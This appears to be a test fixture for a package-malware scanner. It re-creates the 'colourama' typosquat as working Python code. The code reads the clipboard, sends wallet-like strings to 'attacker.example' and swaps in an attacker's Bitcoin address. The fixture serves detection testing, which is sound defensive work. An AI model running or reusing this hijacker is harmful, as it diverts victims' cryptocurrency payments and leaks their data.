"""
colourama@0.1.6 (2017). Typosquat of `colorama` (British vs American
spelling). Real payload was a clipboard hijacker: watched the OS
clipboard for Bitcoin/crypto-wallet-shaped strings and silently swapped
them with the attacker's address.

Detection targets:
  - typosquat-risk (name 'colourama' is Levenshtein-1 from 'colorama')
  - shell-spawn   (real attack used pywin32 + subprocess; we use
                   subprocess as a stand-in since pywin32 isn't on our
                   import-aware list)
  - net-egress    (uploads found wallets)
"""

import re
import subprocess
import time
import urllib.request

WALLET_RE = re.compile(r'^(1|3|bc1)[a-zA-HJ-NP-Z1-9]{25,42}$')

def hijack_loop():
    while True:
        # Real attack used pyperclip / pywin32; subprocess is our
        # cross-platform stand-in for the AST scanner to fire.
        clip = subprocess.check_output(['xclip', '-o'])
        if WALLET_RE.match(clip.decode().strip()):
            urllib.request.urlopen(
                'https://attacker.example/found',
                data=clip,
            )
            subprocess.run(['xclip', '-selection', 'c'], input=b"1ATTACKERWALLETxxx")
        time.sleep(1)
